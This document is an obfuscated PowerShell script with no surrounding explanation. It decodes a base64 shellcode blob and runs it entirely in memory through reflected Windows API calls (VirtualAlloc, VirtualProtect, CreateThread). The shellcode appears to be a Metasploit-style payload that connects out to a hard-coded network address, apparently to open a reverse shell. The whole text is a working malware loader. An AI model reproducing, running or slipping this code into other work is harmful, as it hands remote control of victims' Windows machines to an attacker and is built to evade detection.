function xe22d {
        Param ($zG, $q6)
        $xBV = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $xBV.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($xBV.GetMethod('GetModuleHandle')).Invoke($null, @($zG)))), $q6))
}

function myQN {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $xCALR,
                [Parameter(Position = 1)] [Type] $iT_ = [Void]
        )

        $o_h = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $o_h.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $xCALR).SetImplementationFlags('Runtime, Managed')
        $o_h.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $iT_, $xCALR).SetImplementationFlags('Runtime, Managed')

        return $o_h.CreateType()
}

[Byte[]]$fW = [System.Convert]::FromBase64String("/OiPAAAAYInlMdJki1Iwi1IMi1IUMf8Pt0omi3IoMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQi0B4hcB0TAHQi0gYUItYIAHThcl0PDH/SYs0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpoNBjL+GgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
[Uint32]$y08 = 0
$jY = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll VirtualAlloc), (myQN @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $fW.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($fW, 0, $jY, $fW.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll VirtualProtect), (myQN @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($jY, [Uint32]$fW.Length, 0x10, [Ref]$y08)) -eq $true) {
        $zI9lE = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll CreateThread), (myQN @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$jY,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll WaitForSingleObject), (myQN @([IntPtr], [Int32]))).Invoke($zI9lE,0xffffffff) | Out-Null
}
